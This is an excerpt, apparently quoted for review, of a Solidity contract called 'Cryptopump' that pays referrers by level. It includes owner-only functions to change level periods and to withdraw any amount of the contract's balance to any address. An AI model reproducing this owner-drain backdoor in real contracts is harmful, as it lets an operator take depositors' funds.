...
contract Cryptopump is ContextUpgradeable, OwnableUpgradeable {
    ...
    mapping(uint256 => uint256) public LEVEL_PERIOD;
    ...
    function payForLevel(
        ...
        if (users[referer[0]].currentLevel >= _level) {
            ...
            users[referer[0]].totalEarningEth = users[referer[0]]
                .totalEarningEth
                .add(LEVEL_PRICE[_level]);
            EarnedEth[referer[0]][_level] = EarnedEth[referer[0]][_level].add(
                LEVEL_PRICE[_level]
            );
    ...
    /**
     * @dev Update level period
     */
    function updatePeriod(uint256 _level, uint256 _period)
        public
        returns (bool)
    {
        require(msg.sender == ownerAddress, "only OwnerWallet");

        LEVEL_PERIOD[_level] = _period;
        return true;
    }
    ...
    function withdrawsafeBNB1(address payable _address, uint256 _amount)
        public
    {
        require(msg.sender == ownerAddress, "only OwnerWallet");
        _address.transfer(_amount);
